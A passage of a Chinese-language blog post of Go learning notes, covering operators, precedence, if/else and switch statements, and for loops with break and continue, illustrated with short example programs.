title="关系运算符"></a>关系运算符</h3><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>==</td><td>检查两个值是否相等，如果相等返回true，否则返回false</td></tr><tr><td>!=</td><td>检查两个值是否不相等，如果不相等返回true，否则返回false</td></tr><tr><td>&gt;</td><td>检查左边值是否大于右边值，如果是返回true，否则返回false</td></tr><tr><td>&lt;</td><td>检查左边值是否小于右边值，如果是返回true，否则返回false</td></tr><tr><td>&gt;=</td><td>检查左边值是否大于等于右边值，如果是返回true，否则返回false</td></tr><tr><td>&lt;=</td><td>检查左边值是否小于等于右边值，如果是返回true，否则返回false</td></tr></tbody></table><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span><br><br>import <span class="hljs-string">&quot;fmt&quot;</span><br><br>func <span class="hljs-selector-tag">main</span>() &#123;<br><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> int = <span class="hljs-number">20</span><br><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span> int = <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> == <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a=b&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a!=b&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> &lt; <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&lt;b&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&gt;b&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> &gt; <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&gt;b&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&lt;b&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> &lt;= <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&lt;=b&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> &gt;= <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&gt;=b&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/2.png"></p><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>逻辑and运算符，如果两边的操作数都是true，则条件为true，否则为false</td></tr><tr><td>||</td><td>逻辑or运算符，如果两边的操作数有一个true，则条件为true，否则是false</td></tr><tr><td>!</td><td>逻辑not运算符，如果条件为true，则逻辑not条件false，否则是true</td></tr></tbody></table><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">bool</span> = <span class="hljs-literal">true</span><br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">bool</span> = <span class="hljs-literal">false</span><br><span class="hljs-keyword">if</span> a &amp;&amp; b &#123;<br>fmt.Println(<span class="hljs-string">&quot;a=b&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> a || b &#123;<br>fmt.Println(<span class="hljs-string">&quot;a!=b&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> a &amp;&amp; !b &#123;<br>fmt.Println(<span class="hljs-string">&quot;true&quot;</span>)<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>&amp;</td><td>按位与运算符”&amp;”是双目运算符。参与运算的两数各对应的二进位相与。</td></tr><tr><td>|</td><td>按位或运算符”|”双目运算符。参与运算的两数各对应的二进位相或</td></tr><tr><td>^</td><td>按位异或运算符”^”双目运算符。参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1</td></tr><tr><td>&lt;&lt;</td><td>左移运算符”&lt;&lt;”双目运算符，左移N位就是乘以2的N次方。功能是把”&lt;&lt;”左边的运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0</td></tr><tr><td>&gt;&gt;</td><td>右移运算符”&gt;&gt;”双目运算符，右移N位就是除以2的N次方。功能是把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，”&gt;&gt;”右边的数指定移动的位数。</td></tr></tbody></table><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">uint</span> = <span class="hljs-number">60</span><br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">uint</span> = <span class="hljs-number">13</span><br>fmt.Println(a &amp; b)<br>fmt.Println(a | b)<br>fmt.Println(a ^ b)<br>fmt.Println(a &lt;&lt; <span class="hljs-number">2</span>)<br>fmt.Println(a &gt;&gt; <span class="hljs-number">2</span>)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/4.png"></p><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>=</td><td>简单的赋值运算符，将一个表达式的值赋给一个左值</td></tr><tr><td>+=</td><td>相加后再赋值</td></tr><tr><td>-=</td><td>相减后再赋值</td></tr><tr><td>*=</td><td>相乘后再赋值</td></tr><tr><td>/=</td><td>相除后再赋值</td></tr><tr><td>%=</td><td>求余后再赋值</td></tr><tr><td>&lt;&lt;=</td><td>左移后赋值</td></tr><tr><td>&gt;&gt;=</td><td>右移后赋值</td></tr><tr><td>&amp;=</td><td>按位与后赋值</td></tr><tr><td>^=</td><td>按位异或后赋值</td></tr><tr><td>|=</td><td>按位或后赋值</td></tr></tbody></table><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">package main<br><br>import <span class="hljs-string">&quot;fmt&quot;</span><br><br>func main() &#123;<br>var a int <span class="hljs-operator">=</span> <span class="hljs-number">21</span><br>var <span class="hljs-keyword">c</span> int<br><span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> a<br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> +<span class="hljs-operator">=</span> a<br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> -<span class="hljs-operator">=</span> a<br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> *<span class="hljs-operator">=</span> a<br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> /<span class="hljs-operator">=</span> a<br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span><br><span class="hljs-keyword">c</span> &lt;&lt;<span class="hljs-operator">=</span> <span class="hljs-number">2</span><br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> &gt;&gt;<span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> &amp;<span class="hljs-operator">=</span> <span class="hljs-number">5</span><br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> ^<span class="hljs-operator">=</span> <span class="hljs-number">10</span><br>fmt.Println(<span class="hljs-keyword">c</span>)<br><span class="hljs-keyword">c</span> |<span class="hljs-operator">=</span> <span class="hljs-number">2</span><br>fmt.Println(<span class="hljs-keyword">c</span>)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/5.png"></p><h3 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h3><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>&amp;</td><td>返回变量的存储地址</td></tr><tr><td>*</td><td>指针变量</td></tr></tbody></table><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim">package main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">func</span> main() &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-built_in">int</span> = <span class="hljs-number">4</span><br><span class="hljs-keyword">var</span> <span class="hljs-keyword">ptr</span> *<span class="hljs-built_in">int</span><br><span class="hljs-keyword">ptr</span> = &amp;a<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;a 的值为  %d\n&quot;</span>, a)<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;*ptr 为 %d\n&quot;</span>, *<span class="hljs-keyword">ptr</span>)<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;a)<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, <span class="hljs-keyword">ptr</span>)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/6.png"></p><h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p>优先级，就是当多个运算符出现在同一个表达式之中时，先执行哪个运算符。运算符优先级如下表：</p><table><thead><tr><th>优先级</th><th>分类</th><th>运算符</th><th>结合性</th></tr></thead><tbody><tr><td>1</td><td>逗号运算符</td><td>,</td><td>从左到右</td></tr><tr><td>2</td><td>赋值运算符</td><td>=、+=、-=、*=、/=、%=、&gt;&gt;=、&lt;&lt;=、&amp;=、^=、|=</td><td>从友到左</td></tr><tr><td>3</td><td>逻辑或</td><td>||</td><td>从左到右</td></tr><tr><td>4</td><td>逻辑与</td><td>&amp;&amp;</td><td>从左到右</td></tr><tr><td>5</td><td>按位或</td><td>|</td><td>从左到右</td></tr><tr><td>6</td><td>按位异或</td><td>^</td><td>从左到右</td></tr><tr><td>7</td><td>按位与</td><td>&amp;</td><td>从左到右</td></tr><tr><td>8</td><td>相等/不等</td><td>==、!=</td><td>从左到右</td></tr><tr><td>9</td><td>关系运算符</td><td>&lt;、&lt;=、&gt;、&gt;=</td><td>从左到右</td></tr><tr><td>10</td><td>位移运算符</td><td>&lt;&lt;、&gt;&gt;</td><td>从左到右</td></tr><tr><td>11</td><td>加法/减法</td><td>+、-</td><td>从左到右</td></tr><tr><td>12</td><td>乘法/除法/除余</td><td>*、/、%</td><td>从左到右</td></tr><tr><td>13</td><td>单目运算符</td><td>!、*（指针）、&amp;、++、–、+（正号）、-（负号）</td><td>从右到左</td></tr><tr><td>14</td><td>后缀运算符</td><td>()、[]、-&gt;</td><td>从左到右</td></tr></tbody></table><p>优先级值越大，表示优先级越高</p><h2 id="Go语言条件语句"><a href="#Go语言条件语句" class="headerlink" title="Go语言条件语句"></a>Go语言条件语句</h2><p>if…else语句的语法如下：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> 布尔表达式&#123;<br><span class="hljs-regexp">/*在布尔表达式为true时执行*/</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-regexp">/*在布尔表达式为false时执行*/</span><br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span><br><br>import <span class="hljs-string">&quot;fmt&quot;</span><br><br>func <span class="hljs-selector-tag">main</span>() &#123;<br><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> int<br><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span> int = <span class="hljs-number">10</span><br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;输入a&quot;</span>)<br>fmt<span class="hljs-selector-class">.Scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a)<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> &lt; <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&lt;10&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> &gt; <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a&gt;10&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">a</span> == <span class="hljs-selector-tag">b</span> &#123;<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a==10&quot;</span>)<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/7.png"></p><p>switch语句用于基于不同条件执行不同动作，每一个case分支都是唯一的，从上到下逐一测试，直到匹配为止。</p><p>switch语句执行的过程从上到下，直到匹配项，在匹配项后面也不需要加break。</p><p>switch默认情况下case最后自带break语句，匹配成功后就不会执行其他case，如果需要执行后面的case，可以使用<code>fallthrough</code></p><figure class="highlight dart"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dart">package main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br>func main() &#123;<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">num</span> <span class="hljs-built_in">int</span><br>fmt.Scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;<span class="hljs-built_in">num</span>)<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-built_in">num</span> &lt; <span class="hljs-number">60</span>:<br>fmt.Println(<span class="hljs-string">&quot;F&quot;</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-built_in">num</span> &lt; <span class="hljs-number">70</span>:<br>fmt.Println(<span class="hljs-string">&quot;D&quot;</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-built_in">num</span> &lt; <span class="hljs-number">80</span>:<br>fmt.Println(<span class="hljs-string">&quot;C&quot;</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-built_in">num</span> &lt; <span class="hljs-number">90</span>:<br>fmt.Println(<span class="hljs-string">&quot;B&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;A&quot;</span>)<br>&#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/8.png"></p><h2 id="Go语言循环语句"><a href="#Go语言循环语句" class="headerlink" title="Go语言循环语句"></a>Go语言循环语句</h2><p>for循环是循环控制结构，可以执行指定次数的循环。</p><p>Go的For循环有三种方式，只有其中的一种使用分号。</p><p>和C的for一样：</p><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">for inir<span class="hljs-comment">; condition; post &#123;&#125;</span><br></code></pre></div></td></tr></table></figure><p>和C的while一样：</p><figure class="highlight dust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dust"><span class="xml">for condition</span><span class="hljs-template-variable">&#123;&#125;</span><br></code></pre></div></td></tr></table></figure><p>和C的for(;;)一样：</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-class">for </span>&#123;&#125;<br></code></pre></div></td></tr></table></figure><ul><li>init：一般为赋值表达式，给控制变量赋初值</li><li>condition：关系表达式或逻辑表达式，循环控制条件</li><li>post：一般为赋值表达式，给控制变量增量或减量</li></ul><p>计算1加到100的和</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> sum <span class="hljs-keyword">int</span> = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">100</span>; i++ &#123;<br>sum += i<br>&#125;<br>fmt.Print(sum)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/9.png"></p><p>无限的循环，相当于<code>while（1）</code></p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>sum := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> &#123;<br>sum++<br>fmt.Println(sum)<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>使用<code>break</code>跳出循环，以下示例演示了使用标记和不使用的区别：</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>re:<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">4</span>; i++ &#123;<br>fmt.Println(i)<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">10</span>; j &lt; <span class="hljs-number">13</span>; j++ &#123;<br>fmt.Println(j)<br><span class="hljs-keyword">break</span> re<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/10.png"></p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">4</span>; i++ &#123;<br>fmt.Println(i)<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">10</span>; j &lt; <span class="hljs-number">13</span>; j++ &#123;<br>fmt.Println(j)<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/11.png"></p><p><code>continue</code>语句</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">8</span>; i++ &#123;<br><span class="hljs-keyword">if</span> i == <span class="hljs-number">5</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>fmt.Println(i)<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/12.png"></p><p>使用了标记和不使用标记的</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;使用标记&quot;</span>)<br>re:<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">5</span>; i++ &#123;<br>fmt.Println(i)<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">10</span>; j &lt; <span class="hljs-number">13</span>; j++ &#123;<br>fmt.Println(j)<br><span class="hljs-keyword">continue</span> re<br>&#125;<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;不使用标记&quot;</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">5</span>; i++ &#123;<br>fmt.Println(i)<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">10</span>; j &lt; <span class="hljs-number">13</span>; j++ &#123;<br>fmt.Println(j)<br><span class="hljs-keyword">continue</span><br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/02/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/13.png"></p><h2 id="Go函数"><a 